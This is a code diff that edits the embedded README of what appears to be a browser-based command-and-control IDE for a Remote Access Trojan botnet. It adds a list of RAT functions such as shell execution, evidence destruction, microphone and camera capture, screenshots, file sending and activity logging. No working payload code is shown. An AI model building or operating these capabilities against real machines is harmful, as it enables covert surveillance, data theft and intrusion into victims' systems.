@@ -178,15 +178,55 @@ Version : 4.0.1
 Last Updated : 19 Februvary 2021
 
 
- INTRODUCTION
+    INTRODUCTION
 -----------------------------------
 
-        This is a browser based implementation of an integrated IDE and a custom programming language designed to control Remote Access Trojans (RATs) in a distributed RAT Network. The interface is designed to simulate a basic command and control facility for the communication of RATs in the Network. All RATs on the network are pre-programmed to follow the syntax and definitions of this custom language. A few examples are provided in the Wiki section. Permission for use is granted only for Educational purposes, and are strictly subjected to the conditions specified in the license agreement.
+        This is a browser based implementation of an integrated Environment and an embedded JS Runtime (ace-editor) designed to control Remote Access Trojans (RATs) in a distributed Botnet / RAT Network. The interface is designed to simulate a basic command and control facility for the communication of RATs in the Network. All RATs on the network are pre-programmed to follow the syntax and definitions of this custom language. A few examples are provided in the Wiki section. Permission for use is granted only for Educational purposes, and are strictly subjected to the conditions specified in the license agreement.
 
 
+ LIST OF BUILT-IN FUNCTIONS
+----------------------------------------------------
 
- LANGUAGE
----------------------------------
+1) Excape(x) - Execute Batch script and Escape()
+2) Escape() - Destroy Evidence and Escape
+3) Marco() - Returns Polo if Online
+4) Exit() - End Execution
+5) Update(x) - Updates self
+6) Hibernate(x) -  till date
+7) Revive() - End Hibernation  
+8) Notify() - Notifies power schedule
+9) Rename(x) - Renames RAT
+10) Flash() - Flashes Screen, Visual Indication
+11) Vbs(x) - Runs .VBS Script
+12) Bat(x) - Runs .Bat Script
+13) Shell(x) - Runs Shell Commands
+14) Speak(x) - Text to Speech
+15) Play(x) - Play a Remote (mp3) Audio File (URL)
+16) Mic(x) - Records audio for 'x' ms
+17) Lock(x) - Select Target
+18) Info(x) - Shows Info box
+19) Warn(x) - Shows Warning Box
+20) Error(x) - Shows Error box
+21) Msgbox(x,y) - Shows Msg Box fo 'y' ms
+22) Google(x) - Googles selected Text
+23) Web(x) - Navigates to 'x' url
+24) Type(x) - Types custom text
+25) Screenshot(x) - Takes a Screenshot
+26) Camera(x) - Captures a Photo
+27) Details(x) - Retrieves Disk Info
+28) Tree(x) - Retrieves Disk Info
+29) Send(x) - Sends a File
+30) Zip(x) - Zip a folder
+31) Unzip(x) - Unzips file
+32) Health(x) - Reports back working conditions
+33) Log(x) - Logs every Activity
+34) Delay(x) - Pause Execution temporarily for 'x' ms
+35) Shutdown(x) - Shutsdown the system after 'x' ms"
+36) Clone() - Initiate Clone Operations
+37) NClone() - Stops Cloning Operations
+
+Eg: PC.Lock("A01");
+
 `;
   } else {
    document.getElementById("fne").textContent = "License.txt";
